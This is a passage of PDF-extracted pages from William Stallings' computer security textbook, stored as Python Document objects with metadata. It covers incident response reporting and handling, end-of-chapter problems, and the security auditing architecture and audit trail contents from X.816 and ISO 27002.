\\namong organizational attitudes to such reports. Making such reports clearly helps third \\nparties monitor the overall level of activity and trends in computer crimes. However, \\nparticularly if legal action could be instituted, it may be a liability for the organization \\nM17_STAL0611_04_GE_C17.indd   565 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 567, 'page_label': '566'}, page_content='566  CHAPTER 17 / HUmAN RESOURCES SECURITY\\nto gather and present suitable evidence. While the law may require reporting in some \\ncircumstances, there are many other types of security incidents when the response is \\nnot prescribed. Hence, it must be determined in advance when such reports would \\nbe regarded as appropriate for the organization. There is also a chance that if an inci-\\ndent is reported externally, it might be reported in the public media. An organization \\nshould identify how it would respond in general to such reports.\\nFor example, an organization could decide that cases of computer-assisted fraud \\nshould be reported to both the police and the relevant CERT, with the aim of pros-\\necuting the culprit and recovering any losses. It is often now required by law that \\nbreaches of personal information must be reported to the relevant authorities and that \\nsuitable responses must be taken. However, an incident such as a Website defacement \\nis unlikely to lead to a successful prosecution. Hence, the policy might be for the orga-\\nnization to report these to the relevant CERT and to take steps in response to restore \\nfunctionality as quickly as possible and to minimize the possibility of a repeat attack.\\nAs part of the response to an incident, evidence is gathered about the incident. \\nInitially, this information is used to help recover from the incident. If the incident is \\nreported to the police, then this evidence may also be needed for legal proceedings. \\nIn this case, it is important that careful steps are taken to document the collection \\nprocess for the evidence and its subsequent storage and transfer. If this is not done \\nin accordance with the relevant legal procedures, it is likely the evidence will not be \\nadmissible in court. The procedures required vary from country to country. NIST SP \\n800-61 includes some guidance on this issue.\\nFigure 1 7.2 illustrates a typical incident-handling life cycle. Once an incident is \\nopened, it transitions through a number of states, with all the information relating \\nto the incident (its change of state and associated actions), until no further action is \\nrequired from the team’s perspective and the incident is finally closed. The cyclical \\nportion of Figure 1 7.2 (lower left) indicates those states that may be visited multiple \\ntimes during the activity’s life cycle.\\nFigure 17.2 Incident Handling Life Cycle\\nAnalyze\\nObtain\\ncontact\\ninfo\\nCoordinate\\ninformation\\n& response\\nProvide\\ntechnical\\nassistance\\nResolution\\nHotline/Helpdesk\\ncall center\\nInformation\\nrequest\\nIDS\\nE-mail\\nOthers Vulnerability\\nreport\\nTriage Incident\\nreport\\nM17_STAL0611_04_GE_C17.indd   566 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 568, 'page_label': '567'}, page_content='17.4 / COmPUTER SECURITY INCIDENT RESPONSE TEAmS  567\\nDocumenting Incidents\\nFollowing the immediate response to an incident, there is a need to identify what \\nvulnerability led to its occurrence and how this might be addressed to prevent the \\nincident in the future. Details of the incident and the response taken are recorded \\nfor future reference. The impact on the organization’s systems and their risk profile \\nmust also be reconsidered as a result of the incident.\\nThis typically involves feeding the information gathered as a result of the \\nincident back to an earlier phase of the IT security management process. It is pos -\\nsible that the incident was an isolated rare occurrence and the organization was \\nsimply unlucky for it to occur. More generally, though, a security incident reflects \\na change in the risk profile of the organization that needs to be addressed. This \\ncould involve reviewing the risk assessment of the relevant systems and either \\nchanging or extending this analysis. It could involve reviewing controls identified \\nfor some risks, strengthening existing controls, and implementing new controls. \\nThis reflects the cyclic process of IT security management that we discussed in \\nChapter 14.\\nInformation Flow for Incident Handling\\nA number of services are either a part of or interact with the incident handling func-\\ntion. Table 1 7.3, based on [CARN03], provides examples of the information flow to \\nand from an incident handling service. This type of breakdown is useful in organizing \\nand optimizing the incident handling service and in training personnel on the require-\\nments for incident handling and response.\\nService name\\nInformation flow  \\nto incident handling\\nInformation flow  \\nfrom incident handling\\nAnnouncements Warning of current attack scenario Statistics or status report  \\nNew attack profiles to consider  \\nor research\\nVulnerability  \\nHandling\\nHow to protect against exploitation  \\nof specific vulnerabilities\\nPossible existence of new \\nvulnerabilities\\nMalware Handling Information on how to recognize  \\nuse of specific malware \\nInformation on malware impact/threat\\nStatistics on identification of  \\nmalware in incidents \\nNew malware sample\\nEducation/Training None Practical examples and motivation \\nknowledge\\nIntrusion Detection \\nServices\\nNew incident report New attack profile to check for\\nSecurity Audit or \\nAssessments\\nNotification of penetration test  \\nstart and finish schedules\\nCommon attack scenarios\\nSecurity Consulting Information about common pitfalls  \\nand the magnitude of the threats\\nPractical examples/experiences\\nTable 17.3 Examples of Possible Information Flow to and from the Incident Handling Service\\n(Continued)\\nM17_STAL0611_04_GE_C17.indd   567 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 569, 'page_label': '568'}, page_content='568  CHAPTER 17 / HUmAN RESOURCES SECURITY\\n 17.5 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nService name\\nInformation flow  \\nto incident handling\\nInformation flow  \\nfrom incident handling\\nRisk Analysis Information about common pitfalls  \\nand the magnitude of the threats\\nStatistics or scenarios of loss\\nTechnology Watch Warn of possible future attack scenarios \\nAlert to new tool distribution\\nStatistics or status report  \\nNew attack profiles to  \\nconsider or research\\nDevelopment  \\nof Security Tools\\nAvailability of new tools for  \\nconstituency use\\nNeed for products  \\nProvide view of current practices\\nTable\\xa017.3 (Continued)\\nKey Terms\\ncomputer security incident\\ncomputer security incident \\nresponse team\\ne-mail and Internet use policy\\nincident handling\\nincident response\\nISO 27002\\nsecurity awareness\\nsecurity basics and literacy\\nsecurity education\\nsecurity training\\nReview Questions\\n 17.1 What are the benefits of a security awareness, training, and education program for an \\norganization?\\n 17.2 List the goals of a security awareness program.\\n 17.3 What is the difference between security training and security education?\\n 17.4 Briefly state the security objectives needed when hiring staff, during employment, and \\nwhen terminating employment.\\n 17.5 What is ISO 27002?\\n 17.6 List and explain some steps during the employee hiring process which would posi -\\ntively impact the security of an organization.\\n 17.7 List some issues that should be addressed by an e-mail and Internet use policy.\\n 17.8 What are the benefits of developing an incident response capability?\\n 17.9 List the broad categories of security incidents.\\n 17.10 List some types of tools used to detect and respond to incidents.\\n 17.11 What should occur following the handling of an incident with regard to the overall IT \\nsecurity management process?\\nProblems\\n 17.1 As mentioned in Section 17.2 employees of the parent organization may get involved in \\nsecurity violations. Explain with an example, the different ways in which an employee \\nmay violate the security.\\n 17.2 a. John the janitor of a company is recorded on the security camera one night taking \\nphotocopies of a few documents in the office of the CEO after he is done cleaning \\nit. The film is grainy (from repeated use and re-use) and you cannot ascertain he \\nM17_STAL0611_04_GE_C17.indd   568 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 570, 'page_label': '569'}, page_content='17.5 / KEY TERmS, REVIEW QUESTIONS, AND PROBLEmS  569\\nis taking photo copies of which specific documents. You can see him walking back \\nand forth in the area directly in front of the CEO’s desk where the photocopy \\nmachine is placed. What will you do and what is your justification for your actions?\\nb. What can you do in the future to prevent or at least mitigate any legal challenges \\nthat John the janitor may bring to court?\\n 17.3 During work hours, you notice that David’s work computer is logged on and has been \\nleft unattended for a long time. What actions, if any, do you take?\\n 17.4 You observe Alice has a “data cable” (used for charging and transferring data) one \\nmorning as she is coming into work. What do you do?\\n 17.5 Ema’s personal computer r eveals the installation of a keylogger software. What \\nactions do you take before confronting Ema? Why?\\n 17.6 George has a habit of writing articles for a few magazines. What do you do to check that \\nhis articles do not reveal sensitive company information? Is he allowed to write his articles \\nduring work hours? He argues that he writes articles when he is not at work. How \\ndo you respond? You discover that his article refers to the site YouShouldCheckThis. \\nGeorge states he is not the author of that site. Now what do you do?\\n 17.7 Consider the development of an incident response polic y for the small accounting \\nfirm mentioned in Problems 14.2 and 15.1. Specifically consider the response to the \\ndetection of an e-mail worm infecting some of the company systems and producing \\nlarge volumes of e-mail spreading the propagation. What default decision do you rec-\\nommend the firm’s incident response policy dictate regarding disconnecting the firm’s \\nsystems from the Internet to limit further spread? Take into account the role of such \\ncommunications on the firm’s operations. What default decision do you recommend \\nregarding reporting this incident to the appropriate computer emergency response \\nteam? Or to the relevant law enforcement authorities?\\n 17.8 Consider the development of an incident response policy for the small legal firm men-\\ntioned in Problems 14.3 and 15.2. Specifically, consider the response to the detection \\nof financial fraud by an employee. What initial actions should the incident response \\npolicy specify? What default decision do you recommend regarding reporting this \\nincident to the appropriate CERT? Or to the relevant law enforcement authorities?\\n 17.9 Consider the development of an incident response policy for the Web design  company \\nmentioned in Problems 14.4 and 15.3. Specifically consider the response to the detec-\\ntion of hacking and defacement of the company’s Web server. What default decision \\ndo you recommend its incident response policy dictate regarding disconnecting this \\nsystem from the Internet to limit damaging publicity? Take into account the role of \\nthis server in promoting the company’s operations. What default decision do you \\nrecommend regarding reporting this incident to the appropriate CERT? Or to the \\n relevant law enforcement authorities?\\n 17.10 Consider the development of an incident response polic y for the large government \\ndepartment mentioned in Problems 14.6 and 15.5. Specifically, consider the response \\nto the report of theft of an officially issued laptop from a department employee, which \\nis subsequently found to have contained a large number of sensitive personnel records. \\nWhat default decision do you recommend the department’s incident response policy \\ndictate regarding contacting the personnel whose records have been stolen? What \\ndefault decision should be taken regarding sanctioning the employee whose laptop \\nwas stolen? Take into account any relevant legal requirements and sanctions that may \\napply, and the necessity for relevant items in the department’s IT policy regarding \\nactions. What default decision do you recommend regarding reporting this incident to \\nthe appropriate CERT? Or to the relevant law enforcement authorities?\\nM17_STAL0611_04_GE_C17.indd   569 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 571, 'page_label': '570'}, page_content='18.1 Security Auditing Architecture\\nSecurity Audit and Alarms Model\\nSecurity Auditing Functions\\nRequirements\\nImplementation Guidelines\\n18.2 Security Audit Trail\\nWhat to Collect\\nProtecting Audit Trail Data\\n18.3 Implementing the Logging Function\\nLogging at the System Level\\nLogging at the Application Level\\nInterposable Libraries\\nDynamic Binary Rewriting\\n18.4 Audit Trail Analysis\\nPreparation\\nTiming\\nAudit Review\\nApproaches to Data Analysis\\n18.5 Security Information and Event Management\\nSIEM Systems\\n18.6 Key Terms, Review Questions, and Problems\\nSecurity Auditing\\nCHAPTER \\n \\n570\\nM18_STAL0611_04_GE_C18.indd   570 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 572, 'page_label': '571'}, page_content='CHAPTER 18 / SECURITY AUDITING  571\\nSecurity auditing is a form of auditing that focuses on the security of an organiza -\\ntion’s information technology (IT) assets. This function is a key element in computer \\nsecurity. Security auditing can:\\n• Provide a level of assurance concerning the proper operation of the computer \\nwith respect to security.\\n• Generate data that can be used in after-the-fact analysis of an attack, whether \\nsuccessful or unsuccessful.\\n• Provide a means of assessing inadequacies in the security service.\\n• Provide data that can be used to define anomalous behavior.\\n• Maintain a record useful in computer forensics.\\nTwo key concepts are Security audits and Security audit trails, 1 defined in \\nTable 18.1.\\nThe process of generating audit information yields data that may be useful in real \\ntime for intrusion detection; this aspect is discussed in Chapter 8. In the present  chapter, \\nour concern is with the collection, storage, and analysis of data related to IT security. \\nWe begin with an overall look at the security auditing architecture and how this relates \\nto the companion activity of intrusion detection. Next, we discuss the various aspects of \\naudit trails, also known as audit logs. We then discuss the analysis of audit data.\\n1NIST SP 800-12 (An Introduction to Computer Security: The NIST Handbook, October 1995)  points out \\nthat some security experts make a distinction between an audit trail and an audit log as follows: A log is a \\nrecord of events made by a particular software package, and an audit trail is an entire history of an event, \\npossibly using several logs. However, common usage within the security community does not make use of \\nthis definition. We do not make a distinction in this book.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Discuss the elements that make up a security audit architecture.\\n ◆ Assess the relative advantages of various types of security audit trails.\\n ◆ Understand the key considerations in implementing the logging function for \\nsecurity auditing.\\n ◆ Describe the process of audit trail analysis.\\nTable 18.1 Security Audit Terminology (RFC 4949)\\nSecurity Audit An independent review and examination of a system’s records and activities to deter-\\nmine the adequacy of system controls, ensure compliance with established security policy and procedures, \\ndetect breaches in security services, and recommend any changes that are indicated for countermeasures.\\nThe basic audit objective is to establish accountability for system entities that initiate or par-\\nticipate in security-relevant events and actions. Thus, means are needed to generate and record a \\nsecurity audit trail and to review and analyze the audit trail to discover and investigate attacks and \\nsecurity compromises.\\nSecurity Audit Trail A chronological record of system activities that is sufficient to enable the recon-\\nstruction and examination of the sequence of environments and activities surrounding or leading to an \\noperation,  procedure, or event in a security-relevant transaction from inception to final results.\\nM18_STAL0611_04_GE_C18.indd   571 10/11/17   3:10 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 573, 'page_label': '572'}, page_content='572  CHAPTER 18 / SECURITY AUDITING\\n 18.1 SECURITY AUDITING ARCHITECTURE\\nWe begin our discussion of security auditing by looking at the elements that make up \\na security audit architecture. First, we examine a model that shows security auditing \\nin its broader context. Then, we look at a functional breakdown of security auditing.\\nSecurity Audit and Alarms Model\\nITU-T2 Recommendation X.816 develops a model that shows the elements of the \\nsecurity auditing function and their relationship to security alarms. Figure 18.1 depicts \\nthe model. The key elements are as follows:\\n• Event discriminator: This is logic embedded into the software of the system that \\nmonitors system activity and detects security-related events that it has been \\nconfigured to detect.\\n• Audit recorder: For each detected event, the event discriminator transmits the \\ninformation to an audit recorder. The model depicts this transmission as being \\n2Telecommunication Standardization Sector of the International Telecommunications Union. See \\n Appendix C for a discussion of this and other standards-making organizations.\\nFigure 18.1 Security Audit and Alarms Model (X.816)\\nAction\\nAlarm\\nAlarm\\nAudit\\nmessage\\nEvent\\ndiscriminator\\nAudit\\nrecorder\\nAlarm\\nprocessor\\nAudit\\nanalyzer\\nAudit trail\\nexaminer Security\\nreports\\nAudit\\nproviderSecurity\\naudit\\ntrail\\nAudit\\narchiver\\nArchives\\nAudit\\nrecord\\nM18_STAL0611_04_GE_C18.indd   572 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 574, 'page_label': '573'}, page_content='18.1 / SECURITY AUDITING ARCHITECTURE  573\\nin the form of a message. The audit could also be done by recording the event \\nin a shared memory area.\\n• Alarm processor: Some of the events detected by the event discriminator are \\ndefined to be alarm events. For such events, an alarm is issued to an alarm \\n processor. The alarm processor takes some action based on the alarm. This \\naction is itself an auditable event, and so is transmitted to the audit recorder.\\n• Security audit trail: The audit recorder creates a formatted record of each event \\nand stores it in the security audit trail.\\n• Audit analyzer: The security audit trail is available to the audit analyzer, which, \\nbased on a pattern of activity, may define a new auditable event that is sent to \\nthe audit recorder and may generate an alarm.\\n• Audit archiver: This is a software module that periodically extracts records from \\nthe audit trail to create a permanent archive of auditable events.\\n• Archives: The audit archives are a permanent store of security-related events \\non this system.\\n• Audit provider: The audit provider is an application and/or user interface to \\nthe audit trail.\\n• Audit trail e xaminer: The audit trail examiner is an application or user who \\nexamines the audit trail and the audit archives for historical trends, for  computer \\nforensic purposes, and for other analysis.\\n• Security reports: The audit trail examiner prepares human-readable security \\nreports.\\nThis model illustrates the relationship between audit functions and alarm \\n functions. The audit function builds up a record of events that are defined by the \\nsecurity administrator to be security related. Some of these events may in fact be \\nsecurity violations or suspected security violations. Such events feed into an intrusion \\ndetection or firewall function by means of alarms.\\nAs was the case with intrusion detection, a distributed auditing function in \\nwhich a centralized repository is created can be useful for distributed systems. \\nTwo additional logical components are needed for a distributed auditing service  \\n(see Figure 18.2):\\n• Audit trail collector: A module on a centralized system that collects audit trail \\nrecords from other systems and creates a combined audit trail.\\n• Audit dispatcher: A module that transmits the audit trail records from its local \\nsystem to the centralized audit trail collector.\\nSecurity Auditing Functions\\nIt is useful to look at another breakdown of the security auditing function, devel -\\noped as part of the Common Criteria specification [CCPS12a]. Figure 18.3 shows a \\nbreakdown of security auditing into six major areas, each of which has one or more \\nspecific functions:\\n• Data generation : Identifies the level of auditing, enumerates the types of \\nauditable events, and identifies the minimum set of audit-related information \\nM18_STAL0611_04_GE_C18.indd   573 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 575, 'page_label': '574'}, page_content='574  CHAPTER 18 / SECURITY AUDITING\\nFigure 18.2 Distributed Audit Trail Model (X.816)\\nAudit\\ndispatcher\\nAudit\\ndispatcher\\nAudit\\ntrail collector\\nSecurity\\naudit\\ntrail\\nSecurity\\naudit\\ntrail\\nSecurity\\naudit\\ntrail\\nprovided. This function must also deal with the conflict between security and \\nprivacy and specify for which events the identity of the user associated with an \\naction is included in the data generated as a result of an event.\\n• Event selection: Inclusion or exclusion of events from the auditable set. This \\nallows the system to be configured at different levels of granularity to avoid the \\ncreation of an unwieldy audit trail.\\n• Event storage: Creation and maintenance of the secure audit trail. The storage \\nfunction includes measures to provide availability and to prevent loss of data \\nfrom the audit trail.\\n• Automatic response: Defines reactions taken following detection of events that \\nare indicative of a potential security violation.\\n• Audit analysis: Provided via automated mechanisms to analyze system activity \\nand audit data in search of security violations. This component identifies the set of \\nauditable events whose occurrence or accumulated occurrence indicates a poten-\\ntial security violation. For such events, an analysis is done to determine if a security \\nviolation has occurred; this analysis uses anomaly detection and attack heuristics.\\n• Audit review: As available to authorized users to assist in audit data review. The \\naudit review component may include a selectable review function that provides \\nthe ability to perform searches based on a single criterion or multiple criteria \\nwith logical (i.e., and/or) relations, sort audit data, and filter audit data before \\naudit data are reviewed. Audit review may be restricted to authorized users.\\nRequirements\\nReviewing the functionality suggested by Figures 18.1 and 18.3, we can develop a set of \\nrequirements for security auditing. The first requirement is event definition. The secu-\\nrity administrator must define the set of events that are subject to audit. We will go \\ninto more detail in the next section, but we include here a list suggested in [CCPS12a]:\\n• Introduction of objects within the security-related portion of the software into \\na subject’s address space\\nM18_STAL0611_04_GE_C18.indd   574 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 576, 'page_label': '575'}, page_content='18.1 / SECURITY AUDITING ARCHITECTURE  575\\nFigure 18.3  Common Criteria Security Audit Class Decomposition\\nSecurity audit\\nAudit data generation\\nUser identity association\\nData generation\\nEvent selection Selective audit\\nProtected audit trail storage Guarantees of audit data availability\\nAction in case of possible audit data loss Prevention of audit data loss\\nEvent storage\\nAutomatic response Security alarms\\nAudit analysis Proﬁle-based anomaly detection\\nPotential violation analysis Simple attack heuristics Complex attack heuristics\\nAudit review\\nAudit review\\nRestricted audit review\\nSelectable audit review\\n• Deletion of objects\\n• Distribution or revocation of access rights or capabilities\\n• Changes to subject or object security attributes\\n• Policy checks performed by the security software as a result of a request by a \\nsubject\\n• The use of access rights to bypass a policy check\\n• Use of identification and authentication functions\\nM18_STAL0611_04_GE_C18.indd   575 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 577, 'page_label': '576'}, page_content='576  CHAPTER 18 / SECURITY AUDITING\\n• Security-related actions taken by an operator and/or authorized user (e.g., \\n suppression of a protection mechanism)\\n• Import/export of data from/to removable media (e.g., printed output, magnetic \\nor optical disks, portable USB storage devices)\\nA second requirement is that the appropriate hooks must be available in the \\napplication and system software to enable event detection . Monitoring software \\nneeds to be added to the system and to appropriate places to capture relevant activ-\\nity. Next an event recording function is needed, which includes the need to provide \\nfor a secure storage resistant to tampering or deletion. Event and audit trail analysis \\nsoftware, tools, and interfaces may be used to analyze collected data as well as for \\ninvestigating data trends and anomalies.\\nThere is an additional requirement for the security of the auditing function . \\nNot just the audit trail, but all of the auditing software and intermediate storage must \\nbe protected from bypass or tampering. Finally, the auditing system should have a \\nminimal effect on functionality.\\nImplementation Guidelines\\nISO3 27002 (Code of Practice for Information Security Management, October 2013) \\nprovides a  useful set of guidelines for information systems audit considerations:\\n1. Audit requirements for access to systems and data should be agreed with appro-\\npriate management.\\n2. The scope of technical audit tests should be agreed and controlled.\\n3. Audit tests should be limited to read-only access to software and data.\\n4. Access other than read-only should only be allowed for isolated copies of system \\nfiles, which should be erased when the audit is completed, or given appropriate \\nprotection if there is an obligation to keep such files under audit documentation \\nrequirements.\\n5. Requirements for special or additional processing should be identified and agreed.\\n6. Audit tests that could affect system availability should be run outside business \\nhours.\\n7. All access should be monitored and logged to produce a reference trail.\\n 18.2 SECURITY AUDIT TRAIL\\nAudit trails maintain a record of system activity. This section surveys issues related \\nto audit trails.\\nWhat to Collect\\nThe choice of data to collect is determined by a number of requirements. One issue is \\nthe amount of data to collect, which is determined by the range of areas of interest and \\n3International Organization for Standardization. See Appendix C for a discussion of this and other \\n standards-making organizations, and the List of NIST and ISO Documents.\\nM18_STAL0611_04_GE_C18.indd   576 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 578, 'page_label': '577'}, page_content='18.2 / SECURITY AUDIT TRAIL  577\\nby the granularity of data collection. There is a trade-off here between quantity and \\nefficiency. The more data are collected, the greater is the performance penalty on the \\nsystem. Larger amounts of data may also unnecessarily burden the various algorithms \\nused to examine and analyze the data. Further, the presence of large amounts of data \\ncreates a temptation to generate security reports excessive in number or length.\\nWith these cautions in mind, the first order of business in security audit trail \\ndesign is the selection of data items to capture. These may include:\\n• Events related to the use of the auditing softwar e (i.e., all the components of \\nFigure 18.1).\\n• Events related to the security mechanisms on the system.\\n• Any events that are collected for use by the v arious security detection and \\n prevention mechanisms . These include items relevant to intrusion detection  \\nand items related to firewall operation.\\n• Events related to system management and operation.\\n• Operating system access (e.g., via system calls such as those listed in Table 8.2).\\n• Application access for selected applications.\\n• Remote access.\\nOne example is a suggested list of auditable items in X.816, shown in Table 18.2. \\nThe standard points out that both normal and abnormal conditions may need to be \\nSecurity-related events related to  \\na specific connection\\n— Connection requests\\n— Connection confirmed\\n— Disconnection requests\\n— Disconnection confirmed\\n— Statistics appertaining to the connection\\nSecurity-related events related to the use of  \\nsecurity services\\n— Security service requests\\n— Security mechanisms usage\\n— Security alarms\\nSecurity-related events related to management\\n— Management operations\\n— Management notifications\\nThe list of auditable events should include  \\nat least\\n— Deny access\\n— Authenticate\\n— Change attribute\\n— Create object\\n— Delete object\\n— Modify object\\n— Use privilege\\nIn terms of the individual security services, the following \\nsecurity-related events are important\\n— Authentication: verify success\\n— Authentication: verify fail\\n— Access control: decide access success\\n— Access control: decide access fail\\n— Nonrepudiation: nonrepudiable origination of message\\n— Nonrepudiation: nonrepudiable receipt of message\\n— Nonrepudiation: unsuccessful repudiation of event\\n— Nonrepudiation: successful repudiation of event\\n— Integrity: use of shield\\n— Integrity: use of unshield\\n— Integrity: validate success\\n— Integrity: validate fail\\n— Confidentiality: use of hide\\n— Confidentiality: use of reveal\\n— Audit: select event for auditing\\n— Audit: deselect event for auditing\\n— Audit: change audit event selection criteria\\nTable 18.2 Auditable Items Suggested in X.816\\nM18_STAL0611_04_GE_C18.indd   577 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 579, 'page_label': '578'}, page_content='578  CHAPTER 18 / SECURITY AUDITING\\naudited; for instance, each connection request, such as a TCP connection request, may \\nbe a subject for a security audit trail record, whether or not the request was abnormal \\nand irrespective of whether the request was accepted or not. This is an important \\npoint. Data collection for auditing goes beyond the need to generate security alarms \\nor to provide input to a firewall module. Data representing behavior that does not \\ntrigger an alarm can be used to identify normal versus abnormal usage patterns and \\nthus serve as input to intrusion detection analysis. Also, in the event of an attack, \\nan analysis of all the activity on a system may be needed to diagnose the attack and \\narrive at suitable countermeasures for the future.\\nAnother useful list of auditable events (see Table 18.3) is contained in ISO \\n27002. As with X.816, the ISO standard details both authorized and unauthorized \\nevents, as well as events affecting the security functions of the system.\\nAs the security administrator designs an audit data collection policy, it is useful \\nto organize the audit trail into categories for purposes of choosing data items to col-\\nlect. In what follows, we look at useful categories for audit trail design.\\nSyStem-LeveL A udit trAiLS System-level audit trails are generally used to \\n monitor and optimize system performance but can serve a security audit function \\nas well. The system enforces certain aspects of security policy, such as access to the \\nsystem itself. A system-level audit trail should capture data such as login attempts, \\nboth successful and unsuccessful, devices used, and OS functions performed. Other \\nsystem-level functions may be of interest for auditing, such as system operation and \\nnetwork performance indicators.\\nFigure 18.4a, from NIST SP 800-12 ( An Introduction to Computer Security: \\nThe NIST Handbook, October 1995), is an example of a system-level audit trail on a \\nUNIX system. The shutdown command terminates all processes and takes the system \\ndown to single-user mode. The su command creates a UNIX shell.\\nAppLicAtion-LeveL Audit trAiLS Application-level audit trails may be used to \\ndetect security violations within an application or to detect flaws in the application’s \\ninteraction with the system. For critical applications, or those that deal with sensitive \\ndata, an application-level audit trail can provide the desired level of detail to assess \\na) user IDs\\nb) system activities\\nc) dates, times, and details of key events, for example, log-on and log-off\\nd) device identity or location if possible and system identifier\\ne) records of successful and rejected system access attempts\\nf) records of successful and rejected data and other resource access attempts\\ng) changes to system configuration\\nh) use of privileges\\ni) use of system utilities and applications\\nj) files accessed and the kind of access\\nk) network addressees and protocols\\nl) alarms raised by the access control system\\nm) activation and de-activation of protection systems, such as 